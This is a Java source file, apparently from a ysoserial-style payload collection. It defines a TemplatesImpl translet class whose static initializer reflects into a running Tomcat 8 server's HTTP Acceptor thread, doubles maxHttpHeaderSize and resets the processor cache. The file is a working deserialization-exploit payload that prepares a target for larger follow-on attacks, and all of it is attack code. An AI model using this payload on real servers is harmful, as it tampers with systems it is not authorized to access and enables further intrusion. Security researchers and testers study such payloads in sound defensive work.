package com.ding0x0.yso.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.coyote.AbstractProtocol;
import org.apache.tomcat.util.net.AbstractEndpoint;


import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class ModifyTomcat8MaxHeaderSize extends AbstractTranslet {
    private static synchronized void doWork() {
        try {
            final Method m = Thread.class.getDeclaredMethod("getThreads", (Class<?>[]) new Class[0]);
            m.setAccessible(true);
            final Thread[] ts = (Thread[]) m.invoke(null, new Object[0]);
            for (Thread t :
                ts) {
                if (t.getName().contains("http") && t.getName().contains("Acceptor")) {
                    Field fTarget = t.getClass().getDeclaredField("target");
                    fTarget.setAccessible(true);
                    Object target = fTarget.get(t);
                    Field fThis$0 = target.getClass().getDeclaredField("this$0");
                    fThis$0.setAccessible(true);
                    Object this$0 = fThis$0.get(target);
                    Field fMaxHttpHeaderSize;
                    Field fHandler = this$0.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                    fHandler.setAccessible(true);
                    Object handler = fHandler.get(this$0);
                    Field fProto = handler.getClass().getDeclaredField("proto");
                    fProto.setAccessible(true);
                    Object proto = fProto.get(handler);
                    fMaxHttpHeaderSize = proto.getClass().getSuperclass().getSuperclass().getDeclaredField("maxHttpHeaderSize");
                    fMaxHttpHeaderSize.setAccessible(true);
                    fMaxHttpHeaderSize.set(proto, 8192 * 2);
                    final Field processorCache = AbstractProtocol.class.getDeclaredField("processorCache");
                    processorCache.setAccessible(true);
                    processorCache.set(fProto.get(handler), 0);
                    final AbstractEndpoint.Handler recylerHandler = (AbstractEndpoint.Handler) handler;
                    recylerHandler.recycle();
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(final DOM document, final SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(final DOM document, final DTMAxisIterator iterator, final SerializationHandler handler) throws TransletException {
    }

    static {
        doWork();
    }
}
